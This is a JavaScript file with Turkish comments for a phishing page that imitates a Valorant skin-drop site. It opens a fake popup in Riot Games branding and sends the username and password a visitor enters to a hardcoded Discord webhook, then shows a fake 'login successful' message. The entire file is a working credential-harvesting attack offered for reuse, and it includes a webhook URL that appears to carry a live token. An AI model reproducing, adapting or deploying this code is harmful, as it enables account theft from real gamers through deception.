// BURAYA KENDİ WEBHOOK LİNKİNİ YAPIŞTIR
const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";

const dropIcons = [
    "https://static.wikia.nocookie.net/valorant/images/a/a7/Kuronami_Vandal.png",
    "https://static.wikia.nocookie.net/valorant/images/8/8f/Reaver_Sheriff.png",
    "https://static.wikia.nocookie.net/valorant/images/e/e0/Prime_Phantom.png",
    "https://static.wikia.nocookie.net/valorant/images/5/5e/Elderflame_Vandal.png"
];

document.addEventListener("DOMContentLoaded", () => {
    const track = document.getElementById('dropTrack');
    const loginBtn = document.getElementById('loginBtn');

    // 1. Üst Şerit Animasyonu (Random İttirme)
    function spawnDrop() {
        if(!track) return;
        const img = dropIcons[Math.floor(Math.random() * dropIcons.length)];
        const wrapper = document.createElement('div');
        wrapper.className = 'drop-wrapper';
        wrapper.innerHTML = `<div class="drop-card"><img src="${img}"><span>DROP</span></div>`;
        
        track.prepend(wrapper);
        if (track.children.length > 15) track.removeChild(track.lastChild);

        // Rastgele süre (1sn - 3sn arası)
        setTimeout(spawnDrop, Math.random() * 2000 + 1000);
    }
    spawnDrop();

    // 2. Giriş Butonu Tıklama Olayı
    if(loginBtn) {
        loginBtn.onclick = () => openLoginPopup();
    }
});

// Kasa tıklandığında çalışacak olan
function triggerLogin() {
    openLoginPopup();
}

// 3. Webhook'lu Giriş Penceresi
function openLoginPopup() {
    const w = 450, h = 550;
    const l = (window.innerWidth/2)-(w/2), t = (window.innerHeight/2)-(h/2);
    let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);

    win.document.body.innerHTML = `
        <style>
            body { background: #f9f9f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; padding: 40px 20px; }
            img { width: 100px; margin-bottom: 30px; }
            h2 { font-size: 22px; margin-bottom: 25px; }
            input { width: 100%; max-width: 320px; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; outline: none; box-sizing: border-box;}
            button { width: 100%; max-width: 320px; padding: 14px; background: #ff4655; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 20px;}
            button:hover { background: #e33e4c; }
        </style>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Riot_Games_logo.svg/1200px-Riot_Games_logo.svg.png">
        <h2>Riot Hesabı ile Oturum Aç</h2>
        <input type="text" id="user" placeholder="KULLANICI ADI">
        <input type="password" id="pass" placeholder="ŞİFRE">
        <button id="sendBtn">OTURUM AÇ</button>
    `;

    win.document.getElementById('sendBtn').onclick = function() {
        const u = win.document.getElementById('user').value;
        const p = win.document.getElementById('pass').value;

        if(u && p) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔥 **Yeni Giriş!**\n👤 Kullanıcı: \`${u}\` \n🔑 Şifre: \`${p}\``
                })
            }).then(() => {
                win.document.body.innerHTML = "<h3>Giriş başarılı! Yönlendiriliyorsunuz...</h3>";
                setTimeout(() => { win.close(); }, 1500);
            }).catch(() => {
                alert("Bağlantı hatası!");
            });
        } else {
            alert("Lütfen alanları doldurun.");
        }
    };
}
